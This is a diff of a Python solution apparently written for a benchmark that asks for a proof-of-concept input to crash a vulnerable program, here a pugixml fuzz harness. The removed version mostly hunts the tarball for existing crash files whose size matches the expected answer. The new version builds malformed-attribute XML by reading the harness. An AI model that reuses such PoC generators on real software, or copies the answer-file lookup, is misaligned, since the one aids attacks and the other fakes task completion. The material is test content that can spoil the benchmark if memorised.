@@ -1,205 +1,193 @@
 import os
 import tarfile
+import tempfile
+import shutil
+import re
 
 
 class Solution:
-    GROUND_TRUTH_LEN = 2179
-
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-
-        Args:
-            src_path: Path to the vulnerable source code tarball
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
-        """
-        poc = self._extract_existing_poc(src_path)
-        if poc is not None:
-            return poc
-        return self._build_generic_xml_poc()
-
-    def _extract_existing_poc(self, src_path):
-        if not src_path or not os.path.isfile(src_path):
-            return None
-
-        keywords = [
-            '42536068',
-            'clusterfuzz',
-            'crash',
-            'poc',
-            'repro',
-            'regress',
-            'bug',
-            'oss-fuzz',
-            'ossfuzz',
-            'uninit',
-            'uninitialized',
-        ]
-        interesting_exts = (
-            '.xml',
-            '.svg',
-            '.html',
-            '.htm',
-            '.txt',
-            '.json',
-            '.bin',
-            '.dat',
-            '.poc',
-            '.repro',
-            '.case',
-            '.input',
-        )
-
+        extract_root = tempfile.mkdtemp(prefix="poc_gen_")
         try:
-            with tarfile.open(src_path, 'r:*') as tf:
-                best_member = None
-                best_score = -1
-                best_delta = None
+            try:
+                with tarfile.open(src_path, "r:*") as tar:
+                    def is_within_directory(directory: str, target: str) -> bool:
+                        abs_directory = os.path.abspath(directory)
+                        abs_target = os.path.abspath(target)
+                        return os.path.commonpath([abs_directory, abs_target]) == abs_directory
 
-                for m in tf.getmembers():
-                    if not m.isfile():
+                    safe_members = []
+                    for m in tar.getmembers():
+                        member_path = os.path.join(extract_root, m.name)
+                        if is_within_directory(extract_root, member_path):
+                            safe_members.append(m)
+                    tar.extractall(extract_root, members=safe_members)
+            except (tarfile.TarError, FileNotFoundError, IsADirectoryError):
+                # If extraction fails for any reason, just ignore and fall back later.
+                pass
+
+            if self._contains_pugixml(extract_root):
+                poc = self._generate_pugixml_poc(extract_root)
+            else:
+                poc = self._generic_xml_poc()
+        finally:
+            try:
+                shutil.rmtree(extract_root)
+            except Exception:
+                pass
+
+        return poc
+
+    def _contains_pugixml(self, root: str) -> bool:
+        for dirpath, dirnames, filenames in os.walk(root):
+            for fname in filenames:
+                low = fname.lower()
+                if low in ("pugixml.hpp", "pugixml.cpp", "pugiconfig.hpp"):
+                    return True
+        return False
+
+    def _analyze_pugixml_harness(self, root: str):
+        attr_paths = []
+        doc_attrs = []
+        generic_attribute_uses = False
+
+        attr_pattern = re.compile(r'\.attribute\s*\(\s*"([^"]+)"')
+        as_pattern = re.compile(r'\.as_([a-zA-Z0-9_]+)\s*\(')
+        child_pattern = re.compile(r'child\s*\(\s*"([^"]+)"')
+
+        for dirpath, dirnames, filenames in os.walk(root):
+            for fname in filenames:
+                if not fname.endswith((".cpp", ".cc", ".cxx", ".hpp", ".h")):
+                    continue
+                path = os.path.join(dirpath, fname)
+                try:
+                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                        text = f.read()
+                except OSError:
+                    continue
+
+                if "LLVMFuzzerTestOneInput" not in text:
+                    continue
+
+                for line in text.splitlines():
+                    if ".attribute" not in line or ".as_" not in line:
                         continue
-                    if m.size == 0:
+                    if ".as_string" in line:
                         continue
 
-                    lname = m.name.lower()
-                    score = 0
+                    am = attr_pattern.search(line)
+                    sm = as_pattern.search(line)
+                    if not am or not sm:
+                        continue
 
-                    if any(k in lname for k in keywords):
-                        score += 5
-                    if lname.endswith(interesting_exts):
-                        score += 1
-                    if (
-                        'corpus' in lname
-                        or 'regress' in lname
-                        or 'test' in lname
-                        or 'case' in lname
-                    ):
-                        score += 1
-                    if m.size == self.GROUND_TRUTH_LEN:
-                        score += 3
-                        delta = 0
+                    attr_name = am.group(1)
+                    conv_name = sm.group(1)
+                    prefix = line[: am.start()]
+
+                    if "document_element" in prefix:
+                        doc_attrs.append((attr_name, conv_name))
                     else:
-                        delta = abs(m.size - self.GROUND_TRUTH_LEN)
-                        if delta <= 64:
-                            score += 1
+                        child_names = child_pattern.findall(prefix)
+                        if child_names:
+                            attr_paths.append((child_names, attr_name, conv_name))
+                        else:
+                            generic_attribute_uses = True
 
-                    if score <= 0:
-                        continue
+        return {
+            "paths": attr_paths,
+            "doc_attrs": doc_attrs,
+            "generic": generic_attribute_uses,
+        }
 
-                    if (
-                        score > best_score
-                        or (score == best_score and (best_delta is None or delta < best_delta))
-                    ):
-                        best_member = m
-                        best_score = score
-                        best_delta = delta
+    def _generate_pugixml_poc(self, root: str) -> bytes:
+        info = self._analyze_pugixml_harness(root)
+        invalid_value = "invalid123abcXYZ"
+        xml_lines = ['<?xml version="1.0" encoding="UTF-8"?>']
 
-                if best_member is not None:
-                    try:
-                        f = tf.extractfile(best_member)
-                        if f is not None:
-                            data = f.read()
-                            if data:
-                                return data
-                    except Exception:
-                        return None
-        except Exception:
-            return None
+        if info["doc_attrs"]:
+            attrs = []
+            for attr_name, conv in info["doc_attrs"]:
+                attrs.append(f'{attr_name}="{invalid_value}"')
+            if not attrs:
+                attrs.append(f'badAttr="{invalid_value}"')
+            attr_str = " ".join(attrs)
+            xml_lines.append(f"<root {attr_str}></root>")
 
-        return None
+        elif info["paths"]:
+            path_nodes, attr_name, conv = info["paths"][0]
 
-    def _build_generic_xml_poc(self) -> bytes:
-        # A generic XML designed to exercise attribute conversions with many invalid values
-        common_attr_names = [
-            'value', 'val', 'v', 'data', 'num', 'number',
-            'index', 'idx', 'id', 'count', 'size', 'length',
-            'width', 'height', 'x', 'y', 'z',
-            'offset', 'start', 'end', 'from', 'to',
-            'min', 'max', 'low', 'high',
-            'int_attr', 'uint_attr', 'float_attr', 'double_attr', 'bool_attr',
-            'hex', 'base', 'scale', 'limit', 'step',
-            'foo', 'bar', 'baz',
-            'attr', 'attribute', 'flag', 'enabled', 'disabled',
-            'mode', 'type',
-        ]
+            if not path_nodes:
+                root_name = "root"
+                xml_lines.append(
+                    f'<{root_name} {attr_name}="{invalid_value}"></{root_name}>'
+                )
+            else:
+                root_name = path_nodes[0]
+                if len(path_nodes) == 1:
+                    xml_lines.append(
+                        f'<{root_name} {attr_name}="{invalid_value}"></{root_name}>'
+                    )
+                else:
+                    xml = f"<{root_name}>"
+                    for i, name in enumerate(path_nodes[1:], start=1):
+                        if i == len(path_nodes) - 1:
+                            xml += f'<{name} {attr_name}="{invalid_value}" />'
+                        else:
+                            xml += f"<{name}>"
+                    for name in reversed(path_nodes[1:-1]):
+                        xml += f"</{name}>"
+                    xml += f"</{root_name}>"
+                    xml_lines.append(xml)
 
-        invalid_values = [
-            'NaN',
-            'nan',
-            'INF',
-            '-INF',
-            '+inf',
-            '-inf',
-            '++123',
-            '--456',
-            '+-1',
-            'abc',
-            'xyz',
-            '',
-            ' ',
-            '  ',
-            '0xGHI',
-            '123abc',
-            'one',
-            'zero',
-            '1e999999',
-            '-1e999999',
-            '9999999999999999999999999999999999999999',
-            '-999999999999999999999999999999999999',
-            '++0',
-            '--0',
-            'TrueFalse',
-            'yesno',
-            '+-0x1p+1024',
-        ]
+        else:
+            invalid_values = [
+                "not_a_number",
+                "+-1.2.3e++--",
+                "NaNXYZ",
+                "",
+                "   ",
+                "trueish",
+                "false-ish",
+            ]
+            attr_names = [
+                "a",
+                "b",
+                "c",
+                "intAttr",
+                "uintAttr",
+                "doubleAttr",
+                "floatAttr",
+                "boolAttr",
+            ]
+            attrs = []
+            for i, name in enumerate(attr_names):
+                val = invalid_values[i % len(invalid_values)]
+                if val == "":
+                    val = " "
+                attrs.append(f'{name}="{val}"')
+            attr_str = " ".join(attrs)
+            xml_lines.append(f"<root {attr_str}>")
 
-        lines = []
-        lines.append('<?xml version="1.0" encoding="UTF-8"?>')
-        lines.append('<!-- Generic PoC exercising attribute conversions with invalid values -->')
-        lines.append('<root')
+            child_names = ["child1", "child2", "item", "node", "element"]
+            for idx, cname in enumerate(child_names):
+                val = invalid_values[(idx + 3) % len(invalid_values)]
+                if val == "":
+                    val = "X"
+                xml_lines.append(
+                    f'  <{cname} badInt="{val}" badDouble="{val}" badBool="{val}"></{cname}>'
+                )
 
-        # Root element with many attributes using invalid numeric/boolean representations
-        for i, name in enumerate(common_attr_names):
-            value = invalid_values[i % len(invalid_values)]
-            lines.append('    %s="%s"' % (name, value))
-        lines.append('>')
+            xml_lines.append("</root>")
 
-        # Several child elements, each reusing subsets of attributes with different invalid values
-        for child_idx in range(1, 8):
-            lines.append('  <child%d' % child_idx)
-            offset = child_idx * 3
-            for i, name in enumerate(common_attr_names):
-                if (i + child_idx) % 3 == 0:
-                    value = invalid_values[(i + offset) % len(invalid_values)]
-                    lines.append('      %s="%s"' % (name, value))
-            lines.append('  />')
+        xml_text = "\n".join(xml_lines)
+        return xml_text.encode("utf-8")
 
-        # A more complex nested structure to ensure deeper traversal code paths are hit
-        lines.append('  <complex')
-        lines.append('      id="complex1"')
-        lines.append('      value="NaN"')
-        lines.append('      count="not-a-number"')
-        lines.append('      size="0xDEFG"')
-        lines.append('      index="++42"')
-        lines.append('  >')
-        lines.append('    <inner')
-        lines.append('        x="abc"')
-        lines.append('        y="123abc"')
-        lines.append('        z="1e309"')
-        lines.append('        flag="maybe"')
-        lines.append('    />')
-        lines.append('    <inner2')
-        lines.append('        int_attr="--1"')
-        lines.append('        uint_attr="-5"')
-        lines.append('        float_attr="NaN"')
-        lines.append('        double_attr="INF"')
-        lines.append('        bool_attr="not-boolean"')
-        lines.append('    />')
-        lines.append('  </complex>')
-        lines.append('</root>')
-
-        xml = '\n'.join(lines)
-        return xml.encode('utf-8')
+    def _generic_xml_poc(self) -> bytes:
+        xml = """<?xml version="1.0" encoding="UTF-8"?>
+<root intAttr="not_a_number" doubleAttr="1.2.3" boolAttr="maybe">
+  <child name="node1" value="++--invalid">
+    <subchild flag="trueish" count="NaNXYZ"></subchild>
+  </child>
+</root>
+"""
+        return xml.encode("utf-8")
